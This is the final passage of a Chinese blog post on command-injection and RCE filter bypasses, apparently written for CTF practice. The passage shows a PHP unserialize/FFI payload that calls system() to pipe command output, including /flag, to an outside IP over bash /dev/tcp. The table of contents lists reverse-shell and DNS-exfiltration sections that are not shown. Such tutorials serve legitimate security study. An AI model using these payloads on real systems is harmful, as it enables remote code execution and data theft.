class="string">"ret"</span>;N;s:<span class="number">4</span>:<span class="string">"func"</span>;s:<span class="number">9</span>:<span class="string">"FFI::cdef"</span>;s:<span class="number">3</span>:<span class="string">"arg"</span>;s:<span class="number">26</span>:<span class="string">"int system(char *command);"</span>;&#125;&#125;</span><br><span class="line"></span><br><span class="line">?a=<span class="keyword">include</span>(<span class="string">'preload.php'</span>);unserialize(<span class="string">'C:1:"A":89:&#123;a:3:&#123;s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:26:"int system(char *command);";&#125;&#125;'</span>)-&gt;__get(<span class="string">"ret"</span>)-&gt;system(<span class="string">'bash -c "ls &gt; /dev/tcp/192.168.217.141/8080"'</span>);</span><br><span class="line">发现flag,接下来把命令改成cat /flag即可</span><br><span class="line"></span><br><span class="line">a=unserialize(<span class="string">'C:1:"A":95:&#123;a:3:&#123;s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:32:"int system(const char *command);";&#125;&#125;&#125;'</span>)-&gt;__get(<span class="string">'ret'</span>)-&gt;system(<span class="string">'bash -c "cat /flag &gt; /dev/tcp/192.168.217.141/8080"'</span>);</span><br></pre></td></tr></table></figure>







    </div>

    
    
    

      <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-next post-nav-item">
                <a href="/2019/12/09/web/" rel="next" title="web">
                  <i class="fa fa-chevron-left"></i> web
                </a>
            </div>

            <span class="post-nav-divider"></span>

            <div class="post-nav-prev post-nav-item">
                <a href="/2019/12/20/webshell/" rel="prev" title="webshell">
                  webshell <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
      </footer>
    
  </article>
  
  
  

  </div>


          </div>
          

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#最常用的"><span class="nav-number">1.</span> <span class="nav-text">最常用的</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#命令注入流程"><span class="nav-number">2.</span> <span class="nav-text">命令注入流程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#php代码执行函数"><span class="nav-number">3.</span> <span class="nav-text">php代码执行函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#代码执行漏洞的原因"><span class="nav-number">4.</span> <span class="nav-text">代码执行漏洞的原因</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#过滤-fuzz测试"><span class="nav-number">5.</span> <span class="nav-text">过滤  fuzz测试</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#各种读文件命令"><span class="nav-number">6.</span> <span class="nav-text">各种读文件命令</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#歪门邪道"><span class="nav-number">7.</span> <span class="nav-text">歪门邪道</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#花括号的别样用法"><span class="nav-number">8.</span> <span class="nav-text">花括号的别样用法</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#绕过-有回显-用system系统命令"><span class="nav-number">9.</span> <span class="nav-text">绕过  有回显 用system系统命令</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#命令分隔符-且有前缀-需要消除前边的影响"><span class="nav-number">9.1.</span> <span class="nav-text">命令分隔符 且有前缀 需要消除前边的影响</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#例"><span class="nav-number">9.1.1.</span> <span class="nav-text">例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令终结符-存在后缀需要消除后边的影响"><span class="nav-number">9.2.</span> <span class="nav-text">命令终结符 存在后缀需要消除后边的影响</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#例-1"><span class="nav-number">9.2.1.</span> <span class="nav-text">例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#空格的过滤"><span class="nav-number">9.3.</span> <span class="nav-text">空格的过滤</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#09-20-php环境下"><span class="nav-number">9.3.1.</span> <span class="nav-text">%09 %20(php环境下)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lt-or-gt-or-lt-gt-需要root权限"><span class="nav-number">9.3.2.</span> <span class="nav-text">&lt;or&gt;or&lt;&gt;  需要root权限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IFS-IFS-9"><span class="nav-number">9.3.3.</span> <span class="nav-text">${IFS}&#x2F;$IFS$9</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#黑名单绕过-正则匹配禁用字符-绕过命令语句和文件名"><span class="nav-number">9.4.</span> <span class="nav-text">黑名单绕过  正则匹配禁用字符  绕过命令语句和文件名</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#反斜杠"><span class="nav-number">9.4.1.</span> <span class="nav-text">反斜杠</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#单引号，双引号"><span class="nav-number">9.4.2.</span> <span class="nav-text">单引号，双引号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#连接符截断绕过-反斜杠-单引号，双引号-1-9-利用Shell-特殊变量绕过-a-只能拼接在命令语句和文件名后面-PS2-‘-gt-’-PS4-‘-’"><span class="nav-number">9.4.3.</span> <span class="nav-text">连接符截断绕过  反斜杠    单引号，双引号   $@ $* $1-$9(利用Shell 特殊变量绕过)  $a(只能拼接在命令语句和文件名后面)  ${PS2}  ‘&gt;’ ${PS4}   ‘+’</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用反引号绕过"><span class="nav-number">9.4.4.</span> <span class="nav-text">使用反引号绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#特殊-要记住"><span class="nav-number">9.4.4.1.</span> <span class="nav-text">特殊 要记住</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通配符-，？与斜杠组合绕过-针对文件名的绕过"><span class="nav-number">9.4.5.</span> <span class="nav-text">通配符*，？与斜杠组合绕过  针对文件名的绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#base64编码"><span class="nav-number">9.4.6.</span> <span class="nav-text">base64编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hex编码"><span class="nav-number">9.4.7.</span> <span class="nav-text">hex编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#oct编码"><span class="nav-number">9.4.8.</span> <span class="nav-text">oct编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#字符串拼接-变量绕过"><span class="nav-number">9.4.9.</span> <span class="nav-text">字符串拼接  变量绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#借他人之手来获取字符-env-调用环境变量中有的字符"><span class="nav-number">9.4.10.</span> <span class="nav-text">借他人之手来获取字符   env  调用环境变量中有的字符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#难绕的正则匹配"><span class="nav-number">9.4.11.</span> <span class="nav-text">难绕的正则匹配</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#例-preg-replace-e-模式"><span class="nav-number">9.4.11.1.</span> <span class="nav-text">例  preg_replace &#x2F;e 模式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#例-传参长度有限制的题"><span class="nav-number">9.4.11.2.</span> <span class="nav-text">例  传参长度有限制的题</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#没有回显"><span class="nav-number">10.</span> <span class="nav-text">没有回显</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#第一种利用vps，用nc进行弹shell-反弹shell"><span class="nav-number">10.1.</span> <span class="nav-text">第一种利用vps，用nc进行弹shell  反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#例1"><span class="nav-number">10.1.1.</span> <span class="nav-text">例1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#例2"><span class="nav-number">10.1.2.</span> <span class="nav-text">例2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取shell"><span class="nav-number">10.2.</span> <span class="nav-text">获取shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第二种是msf反向回连"><span class="nav-number">10.3.</span> <span class="nav-text">第二种是msf反向回连</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第三种是利用DNS管道解析"><span class="nav-number">10.4.</span> <span class="nav-text">第三种是利用DNS管道解析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#无参数RCE-R"><span class="nav-number">11.</span> <span class="nav-text">无参数RCE (?R)?</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#无字母的RCE"><span class="nav-number">12.</span> <span class="nav-text">无字母的RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#异或绕过"><span class="nav-number">12.1.</span> <span class="nav-text">异或绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#取反再urlencode绕过-该方法只适用于PHP7"><span class="nav-number">12.2.</span> <span class="nav-text">取反再urlencode绕过   该方法只适用于PHP7</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#无字母的webshell"><span class="nav-number">13.</span> <span class="nav-text">无字母的webshell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#七个字的命令执行-突破长度限制"><span class="nav-number">13.1.</span> <span class="nav-text">七个字的命令执行  突破长度限制</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#绕过ip中的句点网络地址转化为数字地址"><span class="nav-number">14.</span> <span class="nav-text">绕过ip中的句点网络地址转化为数字地址</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#window绕过"><span class="nav-number">15.</span> <span class="nav-text">window绕过</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#绕过escapeshellcmd"><span class="nav-number">16.</span> <span class="nav-text">绕过escapeshellcmd</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题Hitcon2015-babyfirst"><span class="nav-number">16.1.</span> <span class="nav-text">题Hitcon2015_babyfirst</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HITCON-CTF-2017-BabyFirst-Revenge"><span class="nav-number">16.2.</span> <span class="nav-text">HITCON CTF 2017-BabyFirst Revenge</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题"><span class="nav-number">16.3.</span> <span class="nav-text">题</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">zhiliya</p>
  <div class="site-description" itemprop="description">emmmm 感觉没啥好说的</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">38</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
        <span class="site-state-item-count">15</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="feed-link motion-element">
    <a href="/atom.xml" rel="alternate">
      <i class="fa fa-rss"></i>RSS
    </a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">zhiliya</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v4.2.0
  </div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">主题 – <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.5.0
  </div>

        












        
      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  
















  

  

</body>
</html>
